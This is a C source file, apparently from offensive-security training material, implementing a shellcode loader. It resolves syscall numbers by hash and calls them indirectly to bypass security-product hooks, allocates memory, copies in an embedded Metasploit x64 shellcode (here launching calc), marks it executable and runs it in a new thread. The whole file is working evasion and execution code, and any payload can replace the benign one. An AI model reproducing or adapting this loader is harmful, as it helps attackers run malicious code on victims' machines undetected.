#include "header.h"

// Syscalls Hashes Values
#define NtAllocateVirtualMemory_H   [["NtAllocateVirtualMemory"]]
#define NtProtectVirtualMemory_H 	[["NtProtectVirtualMemory"]]
#define NtCreateThreadEx_H 		    [["NtCreateThreadEx"]]
#define NtWaitForSingleObject_H 	[["NtWaitForSingleObject"]]

// a structure to keep the used sycalls
typedef struct _NTAPI_FUNC {
	NT_SYSCALL	NtAllocateVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtCreateThreadEx;
	NT_SYSCALL	NtWaitForSingleObject;
} NTAPI_FUNC, *PNTAPI_FUNC;

NTAPI_FUNC g_Nt = { 0 };
// this will be used to populate the 'g_Nt' structure by calling 'FetchNtSyscall' 
BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_H, &g_Nt.NtAllocateVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
		return FALSE;
	}
	printf("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);


	if (!FetchNtSyscall(NtProtectVirtualMemory_H, &g_Nt.NtProtectVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
		return FALSE;
	}
	printf("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);


	if (!FetchNtSyscall(NtCreateThreadEx_H, &g_Nt.NtCreateThreadEx)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
		return FALSE;
	}
	printf("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);


	if (!FetchNtSyscall(NtWaitForSingleObject_H, &g_Nt.NtWaitForSingleObject)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
		return FALSE;
	}
	printf("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);

	return TRUE;
}



// calc shellcode x64 - metasploit
unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};



int main() {
	NTSTATUS	STATUS		= NULL;
	PVOID		pAddress	= NULL;
	SIZE_T		sSize		= sizeof(Payload);
	DWORD		dwOld		= NULL;
	HANDLE		hProcess	= (HANDLE)-1,	// local process
				hThread		= NULL;
	
	printf("[#] Press <Enter> To Start The Program ... ");
	getchar();

	// initializing the used syscalls
	if (!InitializeNtSyscalls()) {
		printf("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
		return -1;
	}

	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	printf("[i] Calling NtAllocateVirtualMemory ... ");
	// allocating memory
	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
		printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		return -1;
	}
	printf("[+] DONE \n");


	// copying the payload
	printf("[+] Allocated Memory At Address 0x%p \n", pAddress);
	memcpy(pAddress, Payload, sizeof(Payload));
	sSize = sizeof(Payload);

	printf("[i] Calling NtProtectVirtualMemory ... ");
	// changing memory protection
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ, &dwOld)) != 0x00) {
		printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
		return -1;
	}
	printf("[+] DONE \n");


	printf("[#] Press <Enter> To Execute The Payload ... ");
	getchar();

	printf("[i] Calling NtCreateThreadEx ... ");
	// executing the payload
	SET_SYSCALL(g_Nt.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
		printf("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
		return -1;
	}
	printf("[+] DONE \n");
	printf("[+] Thread %d Created Of Entry: 0x%p \n", GetThreadId(hThread), pAddress);


	printf("[i] Calling NtWaitForSingleObject ... ");
	// waiting for the payload
	SET_SYSCALL(g_Nt.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
		printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
		return -1;
	}
	printf("[+] DONE \n");


	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}